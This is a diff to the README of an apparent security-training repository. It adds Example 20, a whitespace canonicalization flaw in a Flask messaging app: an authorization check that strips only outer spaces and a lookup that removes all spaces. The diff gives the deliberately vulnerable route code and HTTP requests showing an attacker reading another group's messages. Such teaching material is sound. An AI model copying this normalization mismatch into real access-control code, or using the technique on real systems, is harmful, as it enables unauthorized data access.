@@ -12,6 +12,7 @@ Canonicalization confusion occurs when an application uses the canonical form in
 |:---:|:---:|:---:|
 | Case Transformation | [Example 18: Lowercase Normalization](#ex-18) | [r01_lowercase/routes.py](r01_lowercase/routes.py#L27-L40) |
 | Case Transformation | [Example 19: Case insensitive Object Retrieval](#ex-19) | [r02_insensitive_object_retrieval/routes.py](r02_insensitive_object_retrieval/routes.py#L27-L41) |
+| Case Transformation | [Example 20: Whitespace Canonicalization](#ex-20) | [r03_whitespace/routes.py](r03_whitespace/routes.py#L27-L55) |
 
 ## Case Transformation
 <a id="ex-18"></a>
@@ -190,6 +191,117 @@ Authorization: Basic spongebob@krusty-krab.sea:bikinibottom
 #   {
 #     "from": "mr.krabs@krusty-krab.sea",
 #     "message": "I accidentaly deleted a new safe password. Spongebob, you need to send it to me by the end of the day!"
+#   }
+# ]
+```
+
+</details>
+
+<a id="ex-20"></a>
+
+### Example 20: Whitespace Canonicalization
+This is a classic whitespace confusion attack - two parts of the code handle whitespace differently: 
+- strip() only removes leading/trailing whitespace 
+- replace(" ", "") removes ALL whitespace
+
+So here's what happens: 
+- @check_group_membership uses strip() - sees "staff @krusty-krab.sea" and keeps the middle space 
+- example20 uses replace() - turns "staff @krusty-krab.sea" into "staff@krusty-krab.sea"
+
+The attack: Plankton creates "staff @krusty-krab.sea" (with space), gets authorized for HIS group, but the code actually fetches messages from "staff@krusty-krab.sea" (Mr. Krabs' group).
+```python
+@bp.get("/example20/groups/<group>/messages")
+@basic_auth
+@check_group_membership
+def example20(group):
+    # Mobile users tend to send requests with whitespaces due to autocompletion.
+    group_no_whitespace = group.replace(" ", "")
+    messages = get_group_messages(group_no_whitespace)
+    
+    return jsonify([m.model_dump() for m in messages])
+
+@bp.post("/example20/groups")
+@basic_auth
+def example20_post():
+    """Create a new group.
+
+    Accepts a POST request with a JSON body:
+    {
+        "name": "string",
+        "users": [{"role": "member" | "admin", "user": "string"}],
+        "messages": [{"from_user": "string", "message": "string"}]
+    }
+    """
+    try:
+        group_request = Group.model_validate_json(request.data)
+    except ValidationError as e:
+        return {"status": "error", "message": str(e)}, 400
+
+    add_group(group_request)
+    return jsonify({"status": "ok"})
+
+def check_group_membership(f):
+    @wraps(f)
+    def decorated_check_group_membership(*args, **kwargs):
+        group = request.view_args.get("group")
+        
+        # Remove extra whitespaces that users can add due to autocompletion
+        group_no_whitespace = group.strip()
+
+        if not is_group_member(g.user, group_no_whitespace):
+            return "Forbidden: not an member for the requested group", 403
+
+        return f(*args, **kwargs)
+
+    return decorated_check_group_membership
+```
+<details>
+<summary><b>See HTTP Request</b></summary>
+
+```http
+@base = http://localhost:8000/vuln/confusion/canonicalization/example20
+
+# Normally: 
+#   Spongebob can see Mr. Krabs messages as he is a member of the group.
+#   Plankton is unable to access these messages directly (because he is not the member of this group)
+GET {{base}}/groups/staff@krusty-krab.sea/messages
+Authorization: Basic spongebob@krusty-krab.sea:bikinibottom
+# Results in the sensitive data disclosure:
+#
+# [
+#   {
+#     "from": "mr.krabs@krusty-krab.sea",
+#     "message": "I am updating the safe password to '123456'. Do not tell anyone!"
+#   }
+# ]
+
+###
+
+# Attack:
+#   Plankton creates a new group with the same name as his victim's group (staff@krusty-krab.sea) but with a whitespace present in the middle.
+POST {{base}}/groups
+Authorization: Basic plankton@chum-bucket.sea:burgers-are-yummy
+Content-Type: application/json
+
+{
+    "name": "staff @krusty-krab.sea",
+    "users": [{"role": "admin", "user": "plankton@chum-bucket.sea"}],
+    "messages": []
+}
+
+###
+
+# Now, when he accesses his newly created group, he actually accesses messages from \`staff@krusty-krab.sea\`,
+# because he is the member of this newly created group, but when the messages are retrived, server returns them
+# from a canonicalized group (with no whitespaces).
+GET {{base}}/groups/staff @krusty-krab.sea/messages
+Authorization: Basic plankton@chum-bucket.sea:burgers-are-yummy
+# Results in the sensitive data disclosure:
+#
+# [
+#   {
+#     "from_user": "mr.krabs@krusty-krab.sea",
+#     "message": "I am updating the safe password to '123456'. Do not tell anyone!"
 #   }
 # ]
 ```
